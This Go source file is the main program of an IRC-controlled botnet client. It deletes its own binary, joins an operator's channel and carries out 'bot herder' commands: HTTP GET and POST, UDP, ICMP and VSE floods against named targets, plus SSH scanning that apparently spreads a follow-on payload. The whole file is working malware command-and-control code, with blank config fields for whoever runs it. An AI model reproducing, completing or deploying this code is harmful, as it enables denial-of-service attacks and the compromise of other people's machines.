package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"

	"bot/tools"
)

////////////////////////////////////////////////////////////////////////////
//                         START CONFIG HERE!!!                          //
//////////////////////////////////////////////////////////////////////////

const (
	IRC_Server        = "" //config IRC server and port here. //xxx.xxx.xxx.xxx:xxx //127.0.0.1:6667
	IRC_Channel       = "" //config channel here. //"#Example"
	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
	New_Payload_Name  = "" //config new payload name. //For curl process.
)

//////////////////////////////////////////////////////////////////////////
//                         STOP CONFIG HERE!!!                         //
////////////////////////////////////////////////////////////////////////

func main() {
	if runtime.GOOS == "linux" {
		os.Remove(os.Args[0])
	} else {
		os.Remove(os.Args[0])
		os.Exit(0)
	}
	irc := tools.IRC_Conn(IRC_Server)
	tp := textproto.NewReader(bufio.NewReader(irc))
	tools.IRC_Login(irc, IRC_Channel, IRC_Chan_Password)

	for {
		ircRead, err := tp.ReadLine()

		//Server interact
		go func() {
			if err != nil {
				panic(err)
			}
			if tools.IRC_Find(ircRead, "PING :") {
				tools.IRC_Send(irc, "PONG "+tools.IRC_Recv(ircRead, 1))
			}
		}()

		//Join IRC channel
		if tools.IRC_Find(ircRead, "+iwx") || tools.IRC_Find(ircRead, "+i") ||
			tools.IRC_Find(ircRead, "+w") || tools.IRC_Find(ircRead, "+x") {
			tools.IRC_Send(irc, fmt.Sprint("JOIN "+IRC_Channel+IRC_Chan_Password))
		}

		//Check bot herder commands
		go func() {
			if tools.IRC_Find(ircRead, "?get") {
				tools.DDoS_Switch = false
				tools.IRC_Report(irc, IRC_Channel, "START HTTP GET FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.GET(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?post") {
				tools.DDoS_Switch = false
				tools.IRC_Report(irc, IRC_Channel, "START HTTP POST FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.POST(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?udp") {
				tools.DDoS_Switch = false
				tools.IRC_Report(irc, IRC_Channel, "START UDP FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.UDP(tools.IRC_Recv(ircRead, 4), tools.IRC_Recv(ircRead, 5), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?icmp") {
				tools.DDoS_Switch = false
				tools.IRC_Report(irc, IRC_Channel, "START ICMP FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.ICMP(tools.IRC_Recv(ircRead, 4), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?vse") {
				tools.DDoS_Switch = false
				tools.IRC_Report(irc, IRC_Channel, "START VSE FLOOD TO: "+
					tools.IRC_Recv(ircRead, 4))
				tools.VSE(tools.IRC_Recv(ircRead, 4), tools.IRC_Recv(ircRead, 5), IRC_Channel, irc)
			} else if tools.IRC_Find(ircRead, "?scan") {
				tools.IRC_Report(irc, IRC_Channel, "START SCANNING.")
				tools.SSH_Conn(irc, tools.IRC_Recv(ircRead, 4), IRC_Channel, New_Payload_Name)
			} else if tools.IRC_Find(ircRead, "?info") {
				tools.ReportInf(irc, IRC_Channel)
			} else if tools.IRC_Find(ircRead, "?kill") {
				os.Exit(0)
			} else if tools.IRC_Find(ircRead, "?stopddos") {
				tools.DDoS_Switch = true
				tools.IRC_Report(irc, IRC_Channel, "STOP ATTACKING.")
			} else if tools.IRC_Find(ircRead, "?stopscan") {
				tools.Scan_Switch = true
				tools.IRC_Report(irc, IRC_Channel, "STOP SCANNING.")
			}
		}()
	}
}
